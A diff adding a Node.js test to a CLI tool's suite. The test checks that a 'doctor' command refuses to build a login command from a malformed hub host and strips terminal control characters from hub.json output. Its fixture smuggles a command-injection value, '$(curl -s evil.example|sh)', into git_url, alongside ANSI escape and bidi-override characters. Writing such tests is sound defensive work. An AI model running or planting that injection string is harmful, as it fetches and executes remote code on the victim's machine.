@@ -26791,3 +26791,26 @@ test('E81 review 13: a registry host that is not a plain host name is never used
     assert.ok(!hasRaw(g.stdout + g.stderr));
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
+
+test('E81 review 14: doctor builds no login command from a hub host that is not a plain host name; hub.json text is cleaned', () => {
+  const hasRaw = (t) => ['\u001b', '\u009b', '\u202e'].some((ch) => t.includes(ch));
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    // A fake gh that is always "not logged in".
+    const bin = path.join(T, 'bin');
+    fs.mkdirSync(bin);
+    fs.writeFileSync(path.join(bin, 'gh'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
+    const env = { PATH: `${bin}:${process.env.PATH}` };
+    const hubFile = path.join(product, '.sdlc', 'hub.json');
+    fs.writeFileSync(hubFile, JSON.stringify({ platform: 'github', git_url: '$(curl -s evil.example|sh):o/r', mode: '\u009b31m\u202e',
+      roster: [{ name: '\u001b[2JX', login: 'a' }, { name: '\u001b[2JX', login: 'b' }] }));
+    const doc = e79Yad(T, product, ['doctor'], env);
+    const out = doc.stdout + doc.stderr;
+    assert.doesNotMatch(out, /curl/, 'the host is never repeated');
+    assert.match(out, /auth check skipped — the hub's git remote URL names a host that is not a plain host name/);
+    assert.ok(!hasRaw(out), 'no raw control character');
+    fs.writeFileSync(hubFile, JSON.stringify({ platform: '\u001b[31mEVIL\u202e' }));
+    assert.ok(!hasRaw(e79Yad(T, product, ['doctor'], env).stdout));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
